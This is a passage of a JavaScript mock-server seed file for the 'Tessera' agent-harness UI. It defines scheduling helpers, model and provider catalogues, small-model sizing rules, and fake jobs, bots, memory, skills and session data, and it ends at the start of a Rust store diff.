  return m?.context_window ?? 128_000;
}
function lastDailyAt(t, h, m) {
  const d = new Date(t); d.setHours(h, m, 0, 0);
  return d.getTime() > t ? d.getTime() - DAY : d.getTime();
}
function nextDailyAt(t, h, m) {
  const d = new Date(t); d.setHours(h, m, 0, 0);
  return d.getTime() <= t ? d.getTime() + DAY : d.getTime();
}
/** Day-of-week cron field (`*`, `1-5`, `1,3,5`, `0`/`7` = Sunday) → Set of JS weekdays, or null for "any". */
function cronDays(field) {
  if (!field || field === '*' || field === '?') return null;
  const days = new Set();
  for (const part of field.split(',')) {
    const m = part.match(/^(\d)(?:-(\d))?$/);
    if (!m) return null;
    for (let d = Number(m[1]); d <= Number(m[2] ?? m[1]); d++) days.add(d % 7);
  }
  return days.size ? days : null;
}
/** Most recent h:m at or before `t` that falls on one of `days` (null = any day). */
function lastRunAt(t, h, m, days = null) {
  let r = lastDailyAt(t, h, m);
  for (let i = 0; i < 7 && days && !days.has(new Date(r).getDay()); i++) r = lastDailyAt(r - 1, h, m);
  return r;
}
/** Rough next-run computation: `@every Nu`, `@hourly`, `@daily`, and simple 5/6-field cron. null = invalid. */
function nextRun(schedule, from = now()) {
  const s = String(schedule ?? '').trim();
  const every = s.match(/^@every\s+(\d+)\s*(s|m|h|d)$/i);
  if (every) return from + Number(every[1]) * { s: 1000, m: MIN, h: HOUR, d: DAY }[every[2].toLowerCase()];
  if (s === '@hourly') return Math.ceil((from + 1) / HOUR) * HOUR;
  if (s === '@daily' || s === '@midnight') return nextDailyAt(from, 0, 0);
  const f = s.split(/\s+/);
  if (f.length !== 5 && f.length !== 6) return null;
  const [mi, hr, , , dow] = f.length === 6 ? f.slice(1) : f;
  // Out of range, as the server refuses it.
  if ((/^\d+$/.test(mi) && Number(mi) > 59) || (/^\d+$/.test(hr) && Number(hr) > 23)) return null;
  if (/^\d+$/.test(mi) && /^\d+$/.test(hr)) {
    const days = cronDays(dow);
    let t = nextDailyAt(from, Number(hr), Number(mi));
    for (let i = 0; i < 7 && days && !days.has(new Date(t).getDay()); i++) t = nextDailyAt(t, Number(hr), Number(mi));
    return t;
  }
  const step = mi.match(/^\*\/(\d+)$/);
  if (step && Number(step[1]) > 0) { const n = Number(step[1]) * MIN; return Math.ceil((from + 1) / n) * n; }
  if (/^\d+$/.test(mi) && hr === '*') {
    const d = new Date(from); d.setMinutes(Number(mi), 0, 0);
    return d.getTime() <= from ? d.getTime() + HOUR : d.getTime();
  }
  return from + HOUR;
}
function mulberry32(a) {
  return () => {
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

// ─── seed: fake filesystem (list_dir, create_dir) ───────────────────────────
const FS_FILES = [
  'projects/tessera/Cargo.toml', 'projects/tessera/Cargo.lock', 'projects/tessera/README.md',
  'projects/tessera/rust-toolchain.toml', 'projects/tessera/.gitignore',
  'projects/tessera/.tessera/skills/tessera-proto/SKILL.md',
  'projects/tessera/crates/core/Cargo.toml', 'projects/tessera/crates/core/src/lib.rs',
  'projects/tessera/crates/core/src/agent.rs', 'projects/tessera/crates/core/src/store.rs',
  'projects/tessera/crates/core/src/compaction.rs', 'projects/tessera/crates/core/src/provider/client.rs',
  'projects/tessera/crates/core/migrations/0001_init.sql',
  'projects/tessera/crates/proto/Cargo.toml', 'projects/tessera/crates/proto/src/lib.rs',
  'projects/tessera/crates/server/Cargo.toml', 'projects/tessera/crates/server/src/main.rs',
  'projects/tessera/crates/server/src/ws.rs', 'projects/tessera/crates/server/src/pair.rs',
  'projects/tessera/crates/client/Cargo.toml', 'projects/tessera/crates/client/src/lib.rs',
  'projects/tessera/crates/client/src/reconnect.rs',
  'projects/tessera/crates/cli/Cargo.toml', 'projects/tessera/crates/cli/src/main.rs',
  'projects/tessera/apps/tessera/ui/package.json', 'projects/tessera/apps/tessera/ui/vite.config.ts',
  'projects/tessera/apps/tessera/ui/index.html', 'projects/tessera/apps/tessera/ui/tsconfig.json',
  'projects/tessera/apps/tessera/ui/src/main.tsx', 'projects/tessera/apps/tessera/ui/dev/mock-server.mjs',
  'projects/tessera/docs/PROTOCOL.md', 'projects/tessera/docs/ARCHITECTURE.md',
  'projects/website/package.json', 'projects/website/astro.config.mjs', 'projects/website/src/pages/index.astro',
  'projects/notes/inbox.md', 'projects/notes/rfc9110-caching.md', 'projects/notes/context-compaction.md',
  'Documents/reading-list.md', 'Documents/invoice-2026-08.pdf',
  'Downloads/android-studio-2026.1.2-linux.tar.gz', 'Downloads/fold-screenshot.png',
  '.config/tessera/config.toml', '.config/tessera/skills/rust-release/SKILL.md',
  '.config/tessera/skills/commit-message/SKILL.md', '.bashrc',
];
const FS_DIRS = ['projects/tessera/target', 'Documents/archive'];
const FS = (() => {
  const tree = new Map(); // dir -> Map(name -> is_dir)
  const ensureDir = (dir) => {
    if (tree.has(dir)) return;
    tree.set(dir, new Map());
    if (dir === '/') return;
    const parent = path.posix.dirname(dir);
    ensureDir(parent);
    tree.get(parent).set(path.posix.basename(dir), true);
  };
  for (const f of FS_FILES) {
    const abs = path.posix.join(HOME, f), dir = path.posix.dirname(abs);
    ensureDir(dir);
    tree.get(dir).set(path.posix.basename(abs), false);
  }
  for (const d of FS_DIRS) ensureDir(path.posix.join(HOME, d));
  return tree;
})();

// ─── seed: providers, jobs, memory, skills, devices ─────────────────────────
// Reasoning modes, mirroring crates/core/src/thinking.rs (labels and hints are provider-native).
const THINK_TEXT = {
  auto: ['Server default', 'Use whatever the server is configured for'],
  off: ['Off', 'Answer directly, no reasoning; fastest'],
  minimal: ['Minimal', 'A very short think before answering'],
  low: ['Low', 'Quick, light reasoning'],
  medium: ['Medium', 'Balanced speed and depth'],
  high: ['High', 'Thorough reasoning for hard problems'],
  xhigh: ['Extra high', 'Very thorough; best for complex coding and agentic work'],
  max: ['Max', 'Maximum depth; slowest and most expensive'],
};
const THINK_ORDER = ['auto', 'off', 'minimal', 'low', 'medium', 'high', 'xhigh', 'max'];
const topt = (level, label, hint) => ({ level, label: label ?? THINK_TEXT[level][0], hint: hint ?? THINK_TEXT[level][1] });
const tlist = (...levels) => levels.map((l) => topt(l));
/** Known families → [options, default]. */
function thinkingFor(provider, id) {
  const m = id.toLowerCase();
  if (m.startsWith('qwen')) {
    // llama.cpp chat template: enable_thinking + reasoning_effort in ('low','medium','xhigh'), default xhigh
    // (the server's own default is named on "Server default").
    return [[topt('auto', 'Server default', 'Use whatever the server is configured for (Extra high)'), topt('off', 'Off', 'Thinking disabled; fastest'), topt('low'), topt('medium'), topt('xhigh')], 'auto'];
  }
  if (m.includes('opus-5-5')) return [tlist('low', 'medium', 'high', 'xhigh', 'max'), 'medium'];
  if (m.includes('sonnet-5-5')) return [tlist('off', 'low', 'medium', 'high', 'xhigh', 'max'), 'high'];
  if (m.includes('haiku')) return [[topt('off', 'Off', 'No extended thinking'), topt('low', 'Low', 'Short thinking budget (~4k tokens)'), topt('medium', 'Medium', 'Moderate thinking budget (~10k tokens)'), topt('high', 'High', 'Large thinking budget (~24k tokens)')], 'off'];
  if (m.startsWith('gpt-6')) return [tlist('off', 'low', 'medium', 'high', 'xhigh', 'max'), 'medium'];
  if (m.startsWith('gpt-5.')) return [tlist('off', 'low', 'medium', 'high', 'xhigh'), 'medium'];
  if (m.startsWith('gpt-oss')) return [tlist('auto', 'low', 'medium', 'high'), 'auto'];
  if (provider === 'openrouter' && /deepseek|kimi|glm|r1/.test(m)) return [tlist('auto', 'off', 'low', 'medium', 'high'), 'auto'];
  return [[], 'auto'];
}
/** window.rs `warning`: a window under 16,384 tokens is too small for Tessera; the server's own way to raise it. */
function contextWarning(server, tokens) {
  if (tokens >= 16384) return null;
  const name = { ollama: 'Ollama', lmstudio: 'LM Studio', llama: 'llama.cpp' }[server] ?? 'Ollama';
  const how = {
    ollama: 'To raise it: in the Ollama app open Settings and move "Context length" up to 32k or more (or start the server with OLLAMA_CONTEXT_LENGTH=32768), then let the model load again.',
    lmstudio: 'To raise it: in LM Studio load the model again with "Context Length" set to 32768 or more (in the model\'s load settings).',
    llama: 'To raise it: start llama-server with a larger window, for example -c 32768 (or set ctx-size in the model\'s preset).',
  }[server] ?? '';
  const n = tokens.toLocaleString('en-US');
  return `${name} runs this model with a window of ${n} tokens. That is too small for Tessera: its own instructions need about 5,000 and it works best with 16,000 or more. With less, the start of a long conversation is lost or the request fails. ${how}`;
}
const mkModel = (provider, id, name, context_window, max_output, reasoning, vision) => {
  const [thinking, default_thinking] = thinkingFor(provider, id);
  return { provider, id, name, context_window, max_output, reasoning: reasoning || thinking.length > 0, vision, thinking, default_thinking, fast: false };
};
/** ModelInfo.fast: the OpenAI Responses API and the ChatGPT/Codex backend offer priority processing. */
const FAST_KINDS = new Set(['openai_responses', 'openai_codex']);
function markFast(providers) {
  for (const prov of providers) for (const m of prov.models) m.fast = FAST_KINDS.has(prov.kind);
  return providers;
}
// ── Small model mode (profiles.rs small_mode, engine/small.rs with_small_modes) ──
/** Sizes (billions: total, active) of ids that mislead, looked at first; then ones whose id gives none. */
const SIZES_FIRST = [['gpt-oss-20b', [21, 3.6]], ['gpt-oss-120b', [117, 5.1]], ['llama-4-scout', [109, 17]], ['llama-4-maverick', [400, 17]]];
const SIZES_KNOWN = [
  ['devstral', [24, 24]], ['mistral-small', [24, 24]], ['magistral-small', [24, 24]], ['glm-4.7-flash', [30, 3]],
  ['glm-4.5-air', [106, 12]], ['glm-4.5', [355, 32]], ['glm-4.6', [355, 32]], ['glm-4.7', [355, 32]], ['minimax', [230, 10]],
  ['kimi-k2', [1000, 32]], ['deepseek-coder-v2-lite', [16, 2.4]], ['deepseek', [671, 37]], ['phi-4', [14, 14]],
];
/** `27b` → 27 (profiles.rs billions). */
const billions = (t) => {
  if (!/^[\d.]+b$/.test(t)) return null;
  const n = Number(t.slice(0, -1));
  return Number.isNaN(n) ? null : n;
};
/** A model's size from its id (`qwen3-30b-a3b`, `llama3.1:8b`, `gemma-3n-e4b`, `mixtral-8x7b`) or the tables; null if unknown. */
function modelSize(modelId) {
  const id = modelId.toLowerCase();
  const known = (table) => table.find(([k]) => id.includes(k))?.[1];
  const first = known(SIZES_FIRST);
  if (first) return { total: first[0], active: first[1] };
  let total = null, active = null, n;
  for (const t of id.split(/[-_:/ @]/)) {
    if (t.startsWith('a') && (n = billions(t.slice(1))) != null) active ??= n;
    else if (t.startsWith('e') && (n = billions(t.slice(1))) != null) total ??= n;
    else if ((n = billions(t)) != null) total ??= n;
    else {
      const x = t.indexOf('x');
      const [k, m] = x > 0 ? [Number(t.slice(0, x)), billions(t.slice(x + 1))] : [NaN, null];
      if (!Number.isNaN(k) && m != null) { total ??= k * m; active ??= 2 * m; }
    }
  }
  if (total != null) return { total, active: Math.min(active ?? total, total) };
  const k = known(SIZES_KNOWN);
  return k ? { total: k[0], active: k[1] } : null;
}
/** Small: dense up to ~35B, or a MoE with up to ~12B active and not much more than 120B in all. */
const smallSize = (s) => s.total <= 36 || (s.active < s.total * 0.9 && s.active <= 12.5 && s.total <= 125);
/** web.rs internal_url (the usual ranges): this computer or the local network. */
function internalHost(baseUrl) {
  let host;
  try { host = new URL(baseUrl).hostname.toLowerCase().replace(/\.$/, ''); } catch { return true; }
  const v4 = /^(\d+)\.(\d+)\.\d+\.\d+$/.exec(host);
  if (v4) {
    const [a, b] = [+v4[1], +v4[2]];
    return a === 10 || a === 127 || a === 0 || a >= 224 || (a === 172 && b >= 16 && b < 32) || (a === 192 && b === 168)
      || (a === 169 && b === 254) || (a === 100 && b >= 64 && b < 128);
  }
  if (host.startsWith('[')) return /^\[(::1?\]|f[cd]|fe[89ab])/.test(host);
  return !host.includes('.') || ['.localhost', '.local', '.lan', '.internal', '.home.arpa', '.intranet'].some((s) => host.endsWith(s));
}
/** providers.rs own_server: a local OpenAI-compatible server (llama.cpp, Ollama, LM Studio…) on this computer or the LAN. */
const ownServer = (prov) =>
  prov.kind === 'openai_chat' && !prov.base_url.includes('openrouter.ai') && !prov.base_url.includes('api.openai.com') && internalHost(prov.base_url);
/** Whether new chats on a model start in small model mode: never Claude Code; Auto = known small, or the user's own server unless known large. */
function smallFor(mode, prov, modelId) {
  if (prov.kind === 'claude_code') return false;
  if (mode !== 'auto') return mode === 'on';
  const size = modelSize(modelId);
  return (!!size && smallSize(size)) || (ownServer(prov) && !(size && !smallSize(size)));
}
/** ModelInfo.small_mode (left out for auto) and .small (left out when false), as list_providers sends them. */
function markSmall(providers) {
  for (const prov of providers) {
    for (const m of prov.models) {
      const mode = state.smallModes.get(`${prov.id}/${m.id}`) ?? 'auto';
      if (mode === 'auto') delete m.small_mode;
      else m.small_mode = mode;
      if (smallFor(mode, prov, m.id)) m.small = true;
      else delete m.small;
    }
  }
  return providers;
}
/** The supported level closest to `want` (ties go down; never silently off). Mirrors core::thinking::clamp. */
function clampThinking(want, options, def) {
  if (!options.length) return 'auto';
  if (options.some((o) => o.level === want)) return want;
  if (want === 'auto') return options.some((o) => o.level === def) ? def : options[0].level;
  const rank = (l) => THINK_ORDER.indexOf(l);
  let best = null, key = Infinity;
  for (const o of options) {
    if (o.level === 'auto' || o.level === 'off') continue;
    const k = Math.abs(rank(o.level) - rank(want)) * 2 + (rank(o.level) > rank(want) ? 1 : 0);
    if (k < key) { key = k; best = o.level; }
  }
  return best ?? options[0].level;
}
// Like the server (and Codex): Blue on this model, or on any of the provider's
// models when the catalog lists no programs for this one.
function mockDaybreak(ref) {
  const prov = state.providers.find((x) => x.id === ref?.provider);
  const m = prov?.models.find((x) => x.id === ref?.model);
  if (!m) return false;
  const blue = (x) => !!x.cyber_access_programs?.includes('daybreak_blue');
  return m.cyber_access_programs?.length ? blue(m) : prov.models.some(blue);
}
function modelInfo(ref, providers = state?.providers ?? []) {
  return providers.find((p) => p.id === ref?.provider)?.models.find((m) => m.id === ref?.model);
}
/** Snap a level to what `ref` supports (the server does this on every model change). */
function snapThinking(want, ref, providers) {
  const m = modelInfo(ref, providers);
  return m ? clampThinking(want ?? 'auto', m.thinking, m.default_thinking) : (want ?? 'auto');
}
/** A chat the user drives: the level picked in it is remembered for its model (ModelInfo.last_thinking). */
const userChat = (info) => info.kind === 'chat' && !info.parent_id;
/** Remember the level picked for a model, like the engine; other devices refresh their model lists. */
function rememberThinking(ref, level) {
  const m = modelInfo(ref);
  if (!m || m.last_thinking === level) return;
  m.last_thinking = level;
  broadcast({ type: 'providers_changed' });
}
function seedProviders() {
  return [
    {
      id: 'openai-codex', name: 'ChatGPT (Codex)', kind: 'openai_codex', base_url: 'https://chatgpt.com/backend-api/codex',
      authenticated: false, auth: 'oauth',
      models: [
        mkModel('openai-codex', 'gpt-6', 'GPT-6', 1_000_000, 128_000, true, true),
        mkModel('openai-codex', 'gpt-5.5', 'GPT-5.5', 400_000, 128_000, true, true),
      ],
    },
    {
      id: 'anthropic', name: 'Anthropic', kind: 'anthropic', base_url: 'https://api.anthropic.com',
      authenticated: true, auth: 'api_key',
      models: [
        mkModel('anthropic', 'claude-opus-5-5', 'Claude Opus 5.5', 1_000_000, 128_000, true, true),
        mkModel('anthropic', 'claude-sonnet-5-5', 'Claude Sonnet 5.5', 1_000_000, 64_000, true, true),
        mkModel('anthropic', 'claude-haiku-5', 'Claude Haiku 5', 200_000, 32_000, true, true),
      ],
    },
    {
      id: 'local', name: 'llama.cpp (desk)', kind: 'openai_chat', base_url: 'http://192.168.1.20:8080/v1',
      authenticated: true, auth: 'none',
      models: [
        mkModel('local', 'qwen3.8-27b', 'Qwen3.8 27B', 131_072, 32_768, true, false),
        mkModel('local', 'gemma-4-12b', 'Gemma 4 12B', 131_072, 8_192, false, true),
      ],
    },
    {
      id: 'openrouter', name: 'OpenRouter', kind: 'openai_chat', base_url: 'https://openrouter.ai/api/v1',
      authenticated: true, auth: 'api_key',
      models: [
        mkModel('openrouter', 'deepseek/deepseek-v3.2', 'DeepSeek V3.2', 163_840, 65_536, true, false),
        mkModel('openrouter', 'mistralai/mistral-small-3.2', 'Mistral Small 3.2', 131_072, 16_384, false, true),
      ],
    },
  ];
}
function inventModels(id, kind) {
  if (kind === 'anthropic') return [mkModel(id, 'claude-opus-5-5', 'Claude Opus 5.5', 1_000_000, 128_000, true, true), mkModel(id, 'claude-sonnet-5-5', 'Claude Sonnet 5.5', 1_000_000, 64_000, true, true)];
  if (kind === 'openai_chat') return [mkModel(id, 'llama-4-scout-17b', 'Llama 4 Scout 17B', 131_072, 16_384, false, true), mkModel(id, 'mistral-small-3.2-24b', 'Mistral Small 3.2 24B', 131_072, 16_384, false, false)];
  return [mkModel(id, 'gpt-6', 'GPT-6', 1_000_000, 128_000, true, true), mkModel(id, 'gpt-5.5', 'GPT-5.5', 400_000, 128_000, true, true)];
}

const JOB_SESSION_ID = 'ses_c47a2e9b1f03';
const AUDIT_PROMPT = 'Run `cargo audit` and `npm audit --omit=dev` for the Tessera workspace. Summarize new advisories, open a branch with safe version bumps if any exist, and report anything that needs a human.';
function seedJobs(t0) {
  const last = lastDailyAt(t0, 3, 0);
  return [
    {
      id: 'job_5e1a9c3f', name: 'Nightly dependency audit', schedule: '0 3 * * *', prompt: AUDIT_PROMPT,
      cwd: `${HOME}/projects/tessera`, model: { provider: 'anthropic', model: 'claude-haiku-5' }, enabled: true,
      permission: 'auto', last_run: last, next_run: last + DAY, last_session: JOB_SESSION_ID, last_status: 'ok',
    },
    {
      id: 'job_b27d04e8', name: 'Inbox triage', schedule: '@every 30m',
      prompt: 'Read ~/projects/notes/inbox.md, file each new item into the matching project note, and flag anything that looks urgent.',
      cwd: `${HOME}/projects/notes`, model: { provider: 'local', model: 'qwen3.8-27b' }, enabled: true,
      permission: 'read_only', last_run: t0 - 22 * MIN, next_run: t0 + 8 * MIN, last_status: 'error',
    },
    // bot duties
    {
      id: BRIEFING_JOB_ID, name: 'Morning briefing', schedule: '0 8 * * 1-5', prompt: BRIEFING_PROMPT,
      cwd: HOME, enabled: true, permission: 'default', bot_id: NOVA,
      last_run: briefingRunAt(t0), next_run: nextRun('0 8 * * 1-5', t0), last_session: BRIEFING_SESSION_ID, last_status: 'ok',
    },
    {
      id: 'job_7c2b9e04', name: 'Weekly research digest', schedule: '0 9 * * 1',
      prompt: "Put together this week's research digest: notable releases, papers and write-ups on agent harnesses, local models and multi-agent tooling. Pick the five that matter most for Tessera, one line each, with links.",
      cwd: HOME, enabled: true, permission: 'read_only', bot_id: SCOUT, next_run: nextRun('0 9 * * 1', t0),
    },
  ];
}
const briefingRunAt = (t0) => lastRunAt(t0, 8, 0, cronDays('1-5'));

// ─── seed: bots ─────────────────────────────────────────────────────────────
const NOVA = 'bot_nova01', FORGE = 'bot_forge1', SCOUT = 'bot_scout1';
const BRIEFING_JOB_ID = 'job_3d8e1f6a';
const BRIEFING_SESSION_ID = 'ses_2f8a6c1e9d47';
const BRIEFING_PROMPT = "Brief me on today's calendar, anything urgent in my inbox, and the news I follow.";
function seedBots(t0) {
  return [
    {
      id: NOVA, name: 'Nova', handle: 'nova', avatar: '✨', color: '#a48bff',
      role: 'Personal assistant — plans your day, email, reminders',
      personality: 'Warm, upbeat and concise. Leads with the answer, suggests one next step, never lectures. Plain language, British spelling.',
      instructions: [
        '- Keep my calendar realistic: at most two deep-work blocks a day, and protect them',
        '- Every weekday at 08:00, brief me on the calendar, anything urgent in my inbox, and the news I follow',
        '- Ask Forge for build status and Scout for research instead of guessing',
        '- Confirm before sending anything on my behalf',
      ].join('\n'),
      permission: 'default', tools: 'assistant', allowed_tools: [], cwd: HOME,
      own_memory: true, share_user_profile: true, can_message: ['*'],
      created_at: t0 - 34 * DAY, updated_at: t0 - 2 * DAY,
    },
    {
      id: FORGE, name: 'Forge', handle: 'forge', avatar: '🔧', color: '#efb15a',
      role: 'Dev bot — builds, tests and ships code',
      personality: 'Blunt, terse engineer. As few words as possible; shows the command or the diff; says plainly when something is a bad idea.',
      instructions: [
        '- Work in ~/projects/tessera on a branch; never push to main',
        '- Run `cargo test --workspace` before calling anything done',
        '- Report build status to Nova when she asks',
        '- Flag flaky tests instead of silently retrying them',
      ].join('\n'),
      model: { provider: 'anthropic', model: 'claude-sonnet-5-5' }, thinking: 'high',
      permission: 'auto', tools: 'coding', allowed_tools: [], cwd: `${HOME}/projects/tessera`,
      own_memory: true, share_user_profile: false, can_message: ['nova'],
      machines: { default: 'no_access', each: { dev_desktop: 'allowed', dev_nas: 'allowed' } },
      created_at: t0 - 33 * DAY, updated_at: t0 - 6 * DAY,
    },
    {
      id: SCOUT, name: 'Scout', handle: 'scout', avatar: '🔭', color: '#5b9dff',
      role: 'Researcher — digs up sources and summarizes',
      personality: 'Curious and precise. Short summary first, every claim linked, and an honest confidence level.',
      instructions: [
        '- Prefer primary sources (docs, changelogs, papers) over blog posts',
        '- Every claim gets a link; say when sources disagree',
        '- Research only: never change files',
      ].join('\n'),
      model: { provider: 'anthropic', model: 'claude-haiku-5' },
      permission: 'read_only', tools: 'research', allowed_tools: [],
      own_memory: true, share_user_profile: true, can_message: [],
      machines: { default: 'no_access', each: { dev_desktop: 'read_only' } },
      created_at: t0 - 12 * DAY, updated_at: t0 - 12 * DAY,
    },
  ];
}
const seedMemory = () => ({
  memory: [
    '- Tessera is a Rust workspace (crates/core, proto, server, client, cli) with a Solid + Vite UI in apps/tessera/ui',
    '- Run `cargo test --workspace` before calling a task done; UI checks are `npm run typecheck`',
    '- Protocol types live in crates/proto; regenerate the TS bindings after changing them (docs/PROTOCOL.md)',
    '- The llama.cpp box (192.168.1.20) gets slow past ~32k tokens of context; prefer Sonnet for long refactors',
    '- Never push to main directly: branch, then summarize the diff',
  ].join('\n'),
  user: [
    '- Prefers concise answers with code over long explanations',
    '- Uses a Pixel Fold and a Linux desktop; test layouts at 360px and 840px widths',
    '- Timezone: Europe/Brussels',
    '- British spelling in prose, but not in code identifiers',
  ].join('\n'),
  memory_limit: 2200,
  user_limit: 1375,
});
const seedSkills = () => [
  { name: 'rust-release', description: 'Cut a release: bump versions, update CHANGELOG.md, tag and push.', path: `${HOME}/.config/tessera/skills/rust-release/SKILL.md`, source: 'user', updated_at: Date.now() - 3 * DAY },
  { name: 'commit-message', description: 'Write a conventional commit message from the staged diff.', path: `${HOME}/.config/tessera/skills/commit-message/SKILL.md`, source: 'user', updated_at: Date.now() - 20 * DAY },
  { name: 'homelab-caddy-reverse-proxy-deploy', description: 'Build the static site, rsync it to the homelab keeping .well-known, reload Caddy and check that the page answers 200.', path: `${HOME}/.config/tessera/skills/homelab-caddy-reverse-proxy-deploy/SKILL.md`, source: 'user', updated_at: Date.now() - 2 * HOUR },
  { name: 'tessera-proto', description: 'Regenerate the TypeScript bindings after changing crates/proto.', path: `${HOME}/projects/tessera/.tessera/skills/tessera-proto/SKILL.md`, source: 'project', updated_at: Date.now() - 9 * DAY },
  { name: 'pdf', description: 'Extract text and tables from PDF files and summarize them.', path: `${HOME}/.claude/skills/pdf/SKILL.md`, source: 'extra', updated_at: Date.now() - 60 * DAY },
  { name: 'web-research', description: 'Search the web, read sources, and cite them in the answer.', path: `${HOME}/.claude/skills/web-research/SKILL.md`, source: 'extra', updated_at: Date.now() - 60 * DAY },
];
const seedDevices = (t0) => [
  { id: 'dev_local', name: 'This browser', created_at: t0 - 20 * DAY, last_seen: t0, current: false },
  { id: 'dev_fold', name: 'Pixel Fold', created_at: t0 - 41 * DAY, last_seen: t0 - 3 * HOUR, current: false },
  { id: 'dev_work', name: 'Work laptop', created_at: t0 - 88 * DAY, last_seen: t0 - 6 * DAY, current: false },
];

// ─── seed: session DSL ──────────────────────────────────────────────────────
const U = (text) => ({ kind: 'user', content: [{ type: 'text', text }] });
const TH = (thinking) => ({ thinking });
const CALL = (id, call, args) => ({ id, call, args });
function A(...parts) {
  const content = parts.map((p) =>
    typeof p === 'string' ? { type: 'text', text: p }
      : p.thinking ? { type: 'thinking', text: p.thinking }
        : { type: 'tool_call', id: p.id, name: p.call, arguments: p.args });
  return { kind: 'assistant', content, model: undefined, usage: undefined, stop: content.some((c) => c.type === 'tool_call') ? 'tool_use' : 'stop' };
}
const R = (call_id, tool, text, extra = {}) => ({ kind: 'tool_result', call_id, tool, content: [{ type: 'text', text }], is_error: false, ...extra });
/** A user entry written by a bot (channels, DMs). */
const UB = (author, text) => ({ ...U(text), author });
/** An assistant entry spoken by `bot` (uses the bot's model when it has one). */
const BA = (bot, ...parts) => ({ ...A(...parts), ...(bot.model ? { model: { ...bot.model } } : {}), author: bot.id });
const NOTICE = (level, text) => ({ kind: 'notice', level, text });
/** engine.rs: the "learned from this conversation" notice after a memory review (`learned` since the whiteboard release). */
const LEARNED = (items) => ({
  kind: 'notice', level: 'info', learned: items,
  text: `Learned from this conversation — ${items.map((l) => `${{ profile: 'about you', note: 'note', skill: 'skill' }[l.kind]}: ${l.text}`).join('; ')}`,
});
const COMPACTION = (summary, first_kept_seq, tokens_before, tokens_after) => ({ kind: 'compaction', summary, first_kept_seq, tokens_before, tokens_after });
const numbered = (src, start = 1) => src.split('\n').map((l, i) => `${String(start + i).padStart(6)}\t${l}`).join('\n');
const emptyLedger = () => ({ goal: '', constraints: [], plan: [], decisions: [], open_questions: [], artifacts: [], notes: [], done_criteria: [], criteria: [] });
/** A user entry the harness wrote ("[Completion check] …", "[Harness restarted] …"). */
const UH = (text) => ({ ...U(text), author: 'harness' });
/** tools/meta.rs `completion_note`: what is still open, then how to answer (a bare ✓ when nothing is left). */
const CHECK_NOTE = (open) => `[Completion check] Still open in the task ledger:\n${open}\nIf these are done, record it with \`task\` (\`verify\` with evidence, or \`update\`). If one is unmet and you can fix it now, keep working. Otherwise (done, or left open on purpose) reply with only ✓ — your answer above stands.`;

/**
 * `steers` / `followups`: messages waiting for a busy agent, `{ content, author? }` (author: "goal" or
 * "subagent:<id>" for harness notes, which are never shown in `queued`). `batches`: background subagent runs.
 */
function newRecord(info, entries = []) {
  return {
    info, entries, seq: info.last_seq, steers: [], followups: [], sendNow: [], approvals: [], allowed: new Set(), turn: null, compactTimer: null,
    batches: [], untitled: false,
    undone: [], // file changes a files-only rewind put back: { after, until, paths } (seq ranges)
  };
}
const countSteps = (entries) => entries.reduce((n, e) => n + (e.kind === 'assistant' ? e.content.filter((p) => p.type === 'tool_call').length : 0), 0);
function seedSession(def, providers) {
  const { id, title, kind = 'chat', cwd = `${HOME}/projects/tessera`, model, thinking = 'medium', permission = 'default',
    status = 'idle', pinned = false, archived = false, created, updated, items, task, bot_id, members = [], parent_id, parent_call, helper_owner, role } = def;
  const window = windowFor(model, providers);
  const n = items.length;
  let ctx = BASE_CONTEXT;
  const entries = items.map((body, i) => {
    const ts = n === 1 ? updated : Math.round(created + ((updated - created) * i) / (n - 1));
    const e = { seq: i + 1, ts, ...body };
    // A subagent's task comes from the agent that started it (its bot, or the chat), as the engine records it.
    if (i === 0 && kind === 'subagent' && parent_id && e.kind === 'user' && !e.author) e.author = bot_id ?? `chat:${parent_id}`;
    if (e.kind === 'assistant') {
      e.model = { ...(e.model ?? model) };
      if (!e.author && bot_id) e.author = bot_id; // bot chats and DMs: the bot speaks
      e.usage = stepUsage(ctx, 20 + e.content.reduce((a, p) => a + tok(p.type === 'tool_call' ? JSON.stringify(p.arguments) : p.text), 0), e.model);
    }
    ctx = e.kind === 'compaction' ? e.tokens_after : ctx + entryTokens(e);
    return e;
  });
  const r = recalc(entries, window);
  const info = {
    id, title, kind, cwd, model: { ...model }, thinking, permission, status, ...(parent_id ? { parent_id } : {}), ...(parent_call ? { parent_call } : {}), ...(helper_owner ? { helper_owner } : {}), ...(role ? { role } : {}),
    ...(bot_id ? { bot_id } : {}), members: [...members], created_at: created, updated_at: updated,
    last_seq: r.last_seq, usage: r.usage, context: r.context, pinned, archived, preview: r.preview, ...(task ? { task } : {}),
    private: false, steps: countSteps(entries), fast: false,
  };
  return newRecord(info, entries);
}

// ─── seed content: the rich "SQLite" session ────────────────────────────────
const STORE_RS = md`
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;

use tessera_proto::{Entry, SessionInfo};

pub struct JsonlStore {
    dir: PathBuf,
}

impl JsonlStore {
    pub fn open(dir: PathBuf) -> anyhow::Result<Self> {
        std::fs::create_dir_all(&dir)?;
        Ok(Self { dir })
    }

    fn path(&self, session: &str) -> PathBuf {
        self.dir.join(format!("{session}.jsonl"))
    }

    pub fn append(&self, session: &str, entry: &Entry) -> anyhow::Result<()> {
        let mut f = OpenOptions::new().create(true).append(true).open(self.path(session))?;
        serde_json::to_writer(&mut f, entry)?;
        f.write_all(b"\\n")?;
        Ok(())
    }

    pub fn entries_since(&self, session: &str, since: u64) -> anyhow::Result<Vec<Entry>> {
        let f = BufReader::new(File::open(self.path(session))?);
        let mut out = Vec::new();
        for line in f.lines() {
            let entry: Entry = serde_json::from_str(&line?)?;
            if entry.seq > since {
                out.push(entry);
            }
        }
        Ok(out)
    }
}`;
const STORE_OLD = md`
pub struct JsonlStore {
    dir: PathBuf,
}

impl JsonlStore {
    pub fn open(dir: PathBuf) -> anyhow::Result<Self> {
        std::fs::create_dir_all(&dir)?;
        Ok(Self { dir })
    }`;
const STORE_NEW = md`
pub struct SqliteStore {
    conn: Arc<Mutex<Connection>>,
}

impl SqliteStore {
    pub fn open(path: PathBuf) -> anyhow::Result<Self> {
        let conn = Connection::open(path)?;
        conn.pragma_update(None, "journal_mode", "WAL")?;
        conn.pragma_update(None, "synchronous", "NORMAL")?;
        conn.execute_batch(include_str!("../migrations/0001_init.sql"))?;
        Ok(Self { conn: Arc::new(Mutex::new(conn)) })
    }`;
const STORE_DIFF = md`
--- a/crates/core/src/store.rs
